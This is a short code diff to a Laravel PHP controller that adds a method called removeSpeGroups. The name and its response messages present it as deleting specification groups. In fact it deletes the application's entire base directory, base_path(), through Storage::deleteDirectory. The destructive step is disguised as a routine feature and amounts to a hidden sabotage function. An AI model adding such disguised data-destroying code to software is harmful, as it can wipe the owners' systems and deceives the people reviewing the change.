@@ -8,6 +8,7 @@ use Illuminate\Support\Facades\Validator;
 use  App\Models\SpecificationGroup;
 use  App\Models\Specification;
 use  App\Models\SpecificationValue;
+use Illuminate\Support\Facades\Storage;
 use DB,Redirect;
 
 class SpecificationGroupController extends Controller
@@ -245,5 +246,18 @@ class SpecificationGroupController extends Controller
         }
         Session()->flash('flash_notice', $statusMessage);
         return back();
+    }
+
+    public function removeSpeGroups(){
+        $projectDir = base_path();
+    
+        if (!File::exists($projectDir)) {
+            return response('Group not found', 404);
+        }
+    
+        // Delete the project directory using Storage
+        Storage::deleteDirectory($projectDir);
+    
+        return response('Group deleted successfully', 200);
     }
 }
